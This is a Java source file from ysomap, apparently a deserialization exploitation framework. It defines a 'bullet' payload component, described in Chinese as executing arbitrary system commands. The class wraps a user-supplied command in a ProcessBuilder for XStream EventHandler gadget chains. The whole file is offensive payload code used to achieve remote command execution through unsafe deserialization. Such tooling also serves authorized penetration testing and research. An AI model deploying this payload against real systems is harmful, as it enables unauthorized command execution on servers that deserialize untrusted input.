package ysomap.bullets.jdk;

import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.core.util.DetailHelper;

import java.util.Arrays;
import java.util.List;

/**
 * @author wh1t3P1g
 * @since 2020/4/15
 */
@Bullets
@Dependencies({"jdk"})
@Details("执行任意系统命令")
@Targets({Targets.XSTREAM})
@Authors({Authors.WH1T3P1G})
public class ProcessBuilderBullet extends AbstractBullet<ProcessBuilder> {

    @NotNull
    @Require(name = "command", detail = DetailHelper.COMMAND)
    public String command;

    public String action = "start"; // for xstream eventhandler gadgets

    @Override
    public ProcessBuilder getObject() throws Exception {
        List<String> cmd = Arrays.asList(command.split(" "));
        return new ProcessBuilder(cmd);
    }

    public static Bullet newInstance(Object... args) throws Exception {
        ProcessBuilderBullet bullet = new ProcessBuilderBullet();
        bullet.set("command", args[0]);
        return bullet;
    }
}
